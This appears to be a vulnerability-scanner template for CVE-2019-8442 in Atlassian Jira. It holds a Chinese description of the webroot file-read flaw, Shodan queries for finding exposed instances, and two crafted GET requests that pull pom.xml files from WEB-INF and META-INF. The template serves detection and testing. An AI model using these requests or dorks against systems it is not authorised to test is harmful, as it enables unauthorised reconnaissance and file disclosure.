id: CVE-2019-8442

info:
  name: Atlassian Jira webroot leak
  author: pa55w0rd
  severity: high
  verified: false
  description: |
    Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。
    Atlassian Jira 7.13.4之前版本、8.0.4之前版本和8.1.1之前版本中的CachingResourceDownloadRewriteRule类存在安全漏洞。远程攻击者可利用该漏洞访问Jira webroot中的文件。
    shodan:
      - http.component:"Atlassian Jira"
      - http.component:"atlassian jira"
      - http.component:"atlassian confluence"
      - cpe:"cpe:2.3:a:atlassian:jira"
  tags: cve,cve2019,atlassian,jira,confluence,webroot-leak
  created: 2023/08/10

set:
  randstr: randomLowercase(6)
rules:
  r0:
    request:
      method: GET
      path: /s/{{randstr}}/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'<groupId>com.atlassian.jira</groupId>')
  r1:
    request:
      method: GET
      path: /s/{{randstr}}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'<groupId>com.atlassian.jira</groupId>')
expression: r0() && r1()
